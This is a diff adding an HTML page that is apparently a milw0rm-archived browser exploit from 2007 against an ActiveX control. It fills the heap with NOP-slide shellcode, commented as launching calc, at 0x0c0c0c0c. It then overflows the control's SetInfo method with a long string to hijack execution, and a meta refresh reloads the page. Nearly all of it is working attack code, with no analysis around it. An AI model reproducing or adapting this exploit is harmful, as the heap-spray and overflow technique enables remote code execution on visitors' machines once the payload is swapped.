@@ -1,0 +1,52 @@
+<html>
+<body>
+<object id="gl" classid="clsid:1C9B434A-0898-498A-B802-B00FA0962214"></object>
+<script>
+document.write("<meta http-equiv=\"refresh\" content=\"1, " + window.location.href + "\"></meta>");
+
+var heapSprayToAddress = 0x0c0c0c0c;
+var shellcode = unescape(
+"%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090" +
+// exec calc
+"%uc931%ue983%ud9de%ud9ee%u2474%u5bf4%u7381%uf513" +
+"%ue2ce%u8369%ufceb%uf4e2%u2609%u69a6%ucef5%u2c69" +
+"%u45c9%u6c9e%ucf8d%ue20d%ud6ba%u3669%ucfd5%u2009" +
+"%ufa7e%u6869%uff1b%uf022%u4a59%u1d22%u0ff2%u6428" +
+"%u0cf4%u9d09%u9ace%u6dc6%u2b80%u3669%ucfd1%u0f09" +
+"%uc27e%ue2a9%ud2aa%u82e3%ud27e%u6869%u471e%u4dbe" +
+"%u0df1%ua9d3%u4591%u59a2%u0e70%u659a%u8e7e%ue2ee" +
+"%ud285%ue24f%uc69d%u6009%u4e7e%u6952%ucef5%u0169" +
+"%u91c9%u9fd3%u9895%u916b%u0e76%u3999%u3e9d%u6d68" +
+"%ua6aa%u977a%uc07f%u96b5%uad12%u0583%uce96%u69e2"
+);
+
+var heapBlockSize = 0x100000;
+var payLoadSize = shellcode.length * 2;
+var spraySlideSize = heapBlockSize - (payLoadSize+0x38);
+var spraySlide = unescape("%u0c0c%u0c0c");
+spraySlide = getSpraySlide(spraySlide,spraySlideSize);
+heapBlocks = (heapSprayToAddress - 0x100000)/heapBlockSize;
+memory = new Array();
+
+for (i=0;i<heapBlocks;i++)
+{
+   memory[i] = spraySlide + shellcode;
+}
+
+function getSpraySlide(spraySlide, spraySlideSize)
+{
+while (spraySlide.length*2<spraySlideSize)
+{
+   spraySlide += spraySlide;
+}
+spraySlide = spraySlide.substring(0,spraySlideSize/2);
+return spraySlide;
+}
+
+var s = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + "\x0c\x0c\x0c\x0c";
+gl.SetInfo("", "", "", 1, 1, 1, "", s);
+</script>
+</body>
+</html>
+
+# milw0rm.com [2007-09-05]
